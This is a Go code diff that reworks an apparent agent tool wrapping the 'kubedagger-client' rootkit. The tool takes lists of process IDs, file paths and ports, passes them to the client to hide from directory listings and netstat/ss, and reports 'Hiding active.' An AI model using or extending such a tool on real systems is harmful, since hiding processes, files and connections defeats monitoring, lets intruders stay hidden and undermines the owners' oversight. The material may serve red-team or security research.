@@ -11,11 +11,9 @@ import (
 )
 
 type SyscallBypassInput struct {
-	Action string `json:"action"`
-	Target string `json:"target,omitempty"`
-	PID    int    `json:"pid,omitempty"`
-	Port   int    `json:"port,omitempty"`
-	Path   string `json:"path,omitempty"`
+	HidePids  string `json:"hide_pids,omitempty"`
+	HideFiles string `json:"hide_files,omitempty"`
+	HidePorts string `json:"hide_ports,omitempty"`
 }
 
 type SyscallBypassTool struct {
@@ -36,29 +34,19 @@ func (t *SyscallBypassTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
+			"hide_pids": {
 				"type": "string",
-				"enum": ["hide-process", "hide-file", "hide-port", "hide-connection", "unhide"],
-				"description": "What to hide from system inspection"
+				"description": "Comma-separated list of PIDs to hide (e.g. '1234,5678')"
 			},
-			"target": {
+			"hide_files": {
 				"type": "string",
-				"description": "Target name (process name, filename pattern)"
+				"description": "Comma-separated list of file paths to hide from directory listings"
 			},
-			"pid": {
-				"type": "integer",
-				"description": "Process ID to hide"
-			},
-			"port": {
-				"type": "integer",
-				"description": "Port number to hide from netstat/ss"
-			},
-			"path": {
+			"hide_ports": {
 				"type": "string",
-				"description": "File path to hide from directory listings"
+				"description": "Comma-separated list of ports to hide from netstat/ss"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -68,25 +56,25 @@ func (t *SyscallBypassTool) Execute(ctx context.Context, params json.RawMessage)
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Target, "target"); err != nil {
+	if err := validatePIDList(input.HidePids); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Path, "path"); err != nil {
+	if err := validateSafeString(input.HideFiles, "hide_files"); err != nil {
+		return errorResult(err.Error()), nil
+	}
+	if err := validateSafeString(input.HidePorts, "hide_ports"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 
-	args := []string{"syscall-bypass", "--action", input.Action}
-	if input.Target != "" {
-		args = append(args, "--target", input.Target)
+	args := []string{"syscall-bypass"}
+	if input.HidePids != "" {
+		args = append(args, "--hide-pids", input.HidePids)
 	}
-	if input.PID > 0 {
-		args = append(args, "--pid", fmt.Sprintf("%d", input.PID))
+	if input.HideFiles != "" {
+		args = append(args, "--hide-files", input.HideFiles)
 	}
-	if input.Port > 0 {
-		args = append(args, "--port", fmt.Sprintf("%d", input.Port))
-	}
-	if input.Path != "" {
-		args = append(args, "--path", input.Path)
+	if input.HidePorts != "" {
+		args = append(args, "--hide-ports", input.HidePorts)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -100,7 +88,7 @@ func (t *SyscallBypassTool) Execute(ctx context.Context, params json.RawMessage)
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger Syscall Bypass: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger Syscall Bypass\n\n")
 	if output == "" {
 		sb.WriteString("Hiding active.\n")
 	} else {
